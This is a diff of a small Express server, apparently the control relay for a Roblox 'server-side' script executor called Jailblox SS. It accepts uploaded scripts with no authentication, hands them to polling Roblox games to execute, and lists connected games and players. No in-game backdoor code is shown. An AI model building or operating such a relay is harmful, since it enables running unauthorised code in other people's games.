@@ -1,69 +1,58 @@
 const express = require('express');
 const cors = require('cors');
+const bodyParser = require('body-parser');
+
 const app = express();
+const port = process.env.PORT || 3000;
 
 app.use(cors());
-app.use(express.json());
+app.use(bodyParser.json());
 
-const PORT = process.env.PORT || 3000;
+let currentScript = null;
+let games = [
+    { id: "123", name: "Juego Test" }
+];
+let players = {
+    "123": ["Player1", "Player2"]
+};
 
-// Datos en memoria (usa DB para producción)
-let games = {};     // { gameId: { id, name, players: [] } }
-let lastScript = "";
-
-// Ruta básica para probar servidor
-app.get('/', (req, res) => {
-  res.send('Servidor Jailblox SS funcionando!');
-});
-
-// Recibir reportes de juegos y jugadores (POST JSON)
-app.post('/report', (req, res) => {
-  const { gameId, gameName, players } = req.body;
-
-  if (!gameId || !gameName || !Array.isArray(players)) {
-    return res.status(400).json({ error: "Datos inválidos" });
-  }
-
-  games[gameId] = {
-    id: gameId,
-    name: gameName,
-    players: players
-  };
-
-  res.json({ status: "Reporte recibido" });
-});
-
-// Devolver lista de juegos conectados
-app.get('/games', (req, res) => {
-  res.json(Object.values(games));
-});
-
-// Devolver lista de jugadores de un juego
-app.get('/players', (req, res) => {
-  const gameId = req.query.gameId;
-  if (!gameId || !games[gameId]) {
-    return res.json([]);
-  }
-  res.json(games[gameId].players);
-});
-
-// Ruta para que Roblox obtenga script a ejecutar
-app.get('/get', (req, res) => {
-  res.setHeader('Content-Type', 'text/plain');
-  res.send(lastScript || "");
-});
-
-// Recibir script para ejecutar (desde la app WPF)
+// Endpoint para subir script
 app.post('/upload', (req, res) => {
-  const { script } = req.body;
-  if (!script || typeof script !== 'string') {
-    return res.status(400).json({ error: "Script inválido" });
-  }
-
-  lastScript = script;
-  res.json({ status: "Script recibido" });
+    if (req.body.script) {
+        currentScript = req.body.script;
+        console.log("Nuevo script recibido:", currentScript);
+        res.json({ status: 'ok' });
+    } else {
+        res.status(400).json({ error: 'No se envió script' });
+    }
 });
 
-app.listen(PORT, () => {
-  console.log(`Servidor escuchando en puerto ${PORT}`);
+// Endpoint para obtener el script (se borra después de enviarlo)
+app.get('/get-script', (req, res) => {
+    if (currentScript) {
+        const scriptToSend = currentScript;
+        currentScript = null; // <- SE LIMPIA para no repetir
+        res.json({ script: scriptToSend });
+    } else {
+        res.json({ script: null });
+    }
+});
+
+// Endpoint para lista de juegos
+app.get('/games', (req, res) => {
+    res.json(games);
+});
+
+// Endpoint para lista de jugadores por juego
+app.get('/players', (req, res) => {
+    const gameId = req.query.gameId;
+    if (gameId && players[gameId]) {
+        res.json(players[gameId]);
+    } else {
+        res.json([]);
+    }
+});
+
+app.listen(port, () => {
+    console.log(`Servidor JailbloxSS corriendo en puerto ${port}`);
 });
